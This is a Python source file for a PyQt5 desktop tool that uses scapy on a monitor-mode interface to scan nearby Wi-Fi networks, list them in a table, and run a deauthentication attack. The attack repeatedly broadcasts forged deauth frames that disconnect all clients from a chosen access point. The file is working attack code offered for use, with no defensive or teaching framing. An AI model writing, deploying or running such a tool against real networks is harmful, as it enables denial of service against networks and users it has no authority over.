from scapy.all import *
from threading import Thread
import pandas
import time
import os
import sys
from PyQt5.QtWidgets import QApplication, QLabel, QMainWindow, QTableWidget, QTableWidgetItem, QVBoxLayout, QWidget, QPushButton

from scapy.layers.dot11 import Dot11, Dot11Elt, Dot11Beacon, Dot11Deauth

networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
networks.set_index("BSSID", inplace=True)

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Wireless Networks")
        self.setFixedSize(800, 600)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        self.table = QTableWidget()
        self.table.setColumnCount(5)
        self.table.setHorizontalHeaderLabels(["BSSID", "SSID", "dBm Signal", "Channel", "Crypto"])
        self.table.horizontalHeader().setStretchLastSection(True)
        self.table.setColumnWidth(0, 200)
        self.table.setColumnWidth(1, 150)
        self.table.setSelectionBehavior(QTableWidget.SelectRows)
        self.table.selectionModel().selectionChanged.connect(self.network_selected)

        layout = QVBoxLayout(central_widget)
        layout.addWidget(QLabel("Available Networks:"))
        layout.addWidget(self.table)

        self.start_button = QPushButton("Start Scan")
        self.start_button.clicked.connect(self.start_sniffing)
        layout.addWidget(self.start_button)

        self.stop_button = QPushButton("Stop Scan")
        self.stop_button.clicked.connect(self.stop_sniffing)
        self.stop_button.setEnabled(False)
        layout.addWidget(self.stop_button)

        self.deauth_button = QPushButton("Start Deauthentication")
        self.deauth_button.clicked.connect(self.toggle_deauth)
        self.deauth_button.setEnabled(False)
        layout.addWidget(self.deauth_button)

        self.channel_changer = Thread(target=self.change_channel)
        self.channel_changer.daemon = True

        self.stop_sniff = False
        self.selected_network_bssid = None
        self.selected_network_channel = None
        self.deauth_running = False

    def network_selected(self):
        selected_items = self.table.selectedItems()
        if selected_items:
            self.selected_network_bssid = selected_items[0].text()
            self.selected_network_channel = int(selected_items[3].text())
            self.deauth_button.setEnabled(True)
        else:
            self.selected_network_bssid = None
            self.selected_network_channel = None
            self.deauth_button.setEnabled(False)

    def toggle_deauth(self):
        if not self.deauth_running:
            if self.selected_network_bssid and self.selected_network_channel:
                self.deauth_thread = Thread(target=self.deauth_attack)
                self.deauth_thread.daemon = True
                self.deauth_thread.start()
                self.deauth_running = True
                self.deauth_button.setText("Stop Deauthentication")
        else:
            self.deauth_running = False
            self.deauth_thread.join()
            self.deauth_button.setText("Start Deauthentication")

    def deauth_attack(self):
        packet = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=self.selected_network_bssid, addr3=self.selected_network_bssid) / Dot11Deauth(reason=7)

        os.system(f"iwconfig wlan0mon channel {self.selected_network_channel}")

        print(f"Deauthenticating {self.selected_network_bssid} on channel {self.selected_network_channel}")
        while self.deauth_running:
            sendp(packet, iface="wlan0mon", count=1, inter=0.1, verbose=False)
            
        print("Deauthentication attack stopped")
        
    def start_sniffing(self):
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.sniffer = Thread(target=self.sniff_networks)
        self.sniffer.daemon = True
        self.sniffer.start()
        self.channel_changer.start()

    def stop_sniffing(self):
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.stop_sniff = True
        self.sniffer.join()
        self.channel_changer.join()

    def sniff_networks(self):
        self.stop_sniff = False
        while not self.stop_sniff:
            sniff(prn=self.callback, iface="wlan0mon", count=1, timeout=0.1)

    def callback(self, packet):
        if packet.haslayer(Dot11) and packet.haslayer(Dot11Elt):
            if packet.haslayer(Dot11Beacon):
                bssid = packet[Dot11].addr2
                ssid = packet[Dot11Elt].info.decode()
                try:
                    dbm_signal = packet.dBm_AntSignal
                except:
                    dbm_signal = "N/A"
                stats = packet[Dot11Beacon].network_stats()
                channel = stats.get("channel")
                crypto = stats.get("crypto")
                networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
                self.update_table()

    def update_table(self):
        self.table.setRowCount(len(networks))
        for i, (bssid, data) in enumerate(networks.iterrows()):
            self.table.setItem(i, 0, QTableWidgetItem(bssid))
            self.table.setItem(i, 1, QTableWidgetItem(data["SSID"]))
            self.table.setItem(i, 2, QTableWidgetItem(str(data["dBm_Signal"])))
            self.table.setItem(i, 3, QTableWidgetItem(str(data["Channel"])))
            self.table.setItem(i, 4, QTableWidgetItem(str(data["Crypto"])))

    def change_channel(self):
        ch = 1
        while True:
            if self.stop_sniff:
                break
            os.system(f"iwconfig wlan0mon channel {ch}")
            ch = ch % 14 + 1
            time.sleep(0.5)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())

